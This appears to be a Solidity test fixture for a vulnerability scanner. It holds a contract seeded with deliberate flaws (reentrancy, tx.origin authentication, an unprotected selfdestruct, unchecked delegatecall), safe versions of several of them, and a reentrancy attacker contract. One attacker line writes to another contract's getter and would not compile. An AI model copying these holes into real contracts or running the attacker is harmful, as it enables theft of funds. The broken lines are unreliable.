// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * VulnerableContract.sol
 * 
 * This contract contains various vulnerabilities for testing Lynx.
 * DO NOT USE IN PRODUCTION - FOR TESTING PURPOSES ONLY
 */

contract VulnerableContract {
    mapping(address => uint256) public balances;
    address public owner;
    uint256 public totalSupply;
    
    constructor() {
        owner = msg.sender;
        totalSupply = 1000000;
        balances[owner] = totalSupply;
    }
    
    // VULNERABILITY: Reentrancy attack
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // External call before state change - VULNERABLE
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // State change after external call - TOO LATE!
        balances[msg.sender] -= amount;
    }
    
    // VULNERABILITY: tx.origin authentication
    function emergencyTransfer(address to, uint256 amount) external {
        // Using tx.origin instead of msg.sender - VULNERABLE
        require(tx.origin == owner, "Only owner can emergency transfer");
        balances[owner] -= amount;
        balances[to] += amount;
    }
    
    // VULNERABILITY: Unchecked low-level call
    function forwardCall(address target, bytes calldata data) external {
        require(msg.sender == owner, "Only owner");
        
        // Unchecked low-level call - VULNERABLE
        target.call(data);
        // Return value not checked!
    }
    
    // VULNERABILITY: Integer overflow (pre-0.8.0)
    function unsafeAdd(uint256 a, uint256 b) public pure returns (uint256) {
        // No SafeMath used - VULNERABLE in older Solidity versions
        return a + b;
    }
    
    // VULNERABILITY: Weak randomness
    function randomWinner() external view returns (address) {
        // Using block properties for randomness - VULNERABLE
        uint256 random = uint256(keccak256(abi.encodePacked(
            block.timestamp,
            block.difficulty,
            block.number
        )));
        
        address[] memory participants = getParticipants();
        return participants[random % participants.length];
    }
    
    // VULNERABILITY: Unsafe delegatecall
    function proxyCall(address target, bytes calldata data) external {
        require(msg.sender == owner, "Only owner");
        
        // Unchecked delegatecall - VULNERABLE
        target.delegatecall(data);
    }
    
    // VULNERABILITY: Unprotected selfdestruct
    function destroy() external {
        // No access control - VULNERABLE
        selfdestruct(payable(msg.sender));
    }
    
    // VULNERABILITY: Timestamp dependence
    function timeBasedAction() external {
        // Using block.timestamp for critical logic - VULNERABLE
        require(block.timestamp > 1640995200, "Too early");
        
        if (block.timestamp % 2 == 0) {
            balances[msg.sender] += 100;
        }
    }
    
    // VULNERABILITY: DoS via gas limit
    address[] public users;
    
    function distributeRewards() external {
        // Unbounded loop - VULNERABLE
        for (uint256 i = 0; i < users.length; i++) {
            balances[users[i]] += 10;
        }
    }
    
    // VULNERABILITY: Missing zero address check
    function transferOwnership(address newOwner) external {
        require(msg.sender == owner, "Only owner");
        // No zero address check - VULNERABLE
        owner = newOwner;
    }
    
    // SAFE: Proper reentrancy protection
    bool private locked;
    
    modifier nonReentrant() {
        require(!locked, "ReentrancyGuard: reentrant call");
        locked = true;
        _;
        locked = false;
    }
    
    function safeWithdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // State change first (checks-effects-interactions)
        balances[msg.sender] -= amount;
        
        // External call last
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    // SAFE: Proper authentication
    function properTransfer(address to, uint256 amount) external {
        require(msg.sender == owner, "Only owner can transfer");
        balances[owner] -= amount;
        balances[to] += amount;
    }
    
    // SAFE: Checked low-level call
    function safeForwardCall(address target, bytes calldata data) external returns (bool) {
        require(msg.sender == owner, "Only owner");
        
        (bool success, ) = target.call(data);
        return success;
    }
    
    // SAFE: Protected selfdestruct
    function safeDestroy() external {
        require(msg.sender == owner, "Only owner");
        selfdestruct(payable(owner));
    }
    
    // SAFE: Zero address check
    function safeTransferOwnership(address newOwner) external {
        require(msg.sender == owner, "Only owner");
        require(newOwner != address(0), "New owner cannot be zero address");
        owner = newOwner;
    }
    
    // Helper functions
    function getParticipants() internal pure returns (address[] memory) {
        address[] memory participants = new address[](3);
        participants[0] = address(0x1);
        participants[1] = address(0x2);
        participants[2] = address(0x3);
        return participants;
    }
    
    function addUser(address user) external {
        users.push(user);
    }
    
    receive() external payable {
        balances[msg.sender] += msg.value;
    }
}

/**
 * ReentrancyAttacker.sol
 * 
 * Example attacker contract for testing reentrancy detection
 */
contract ReentrancyAttacker {
    VulnerableContract public target;
    uint256 public attackAmount;
    
    constructor(address _target) {
        target = VulnerableContract(_target);
        attackAmount = 1 ether;
    }
    
    function attack() external payable {
        require(msg.value >= attackAmount, "Need at least 1 ETH to attack");
        
        // Deposit some ETH to have a balance
        target.balances[address(this)] = attackAmount;
        
        // Start the reentrancy attack
        target.withdraw(attackAmount);
    }
    
    // This function will be called when target sends ETH
    receive() external payable {
        if (address(target).balance >= attackAmount) {
            // Reentrant call to drain more funds
            target.withdraw(attackAmount);
        }
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
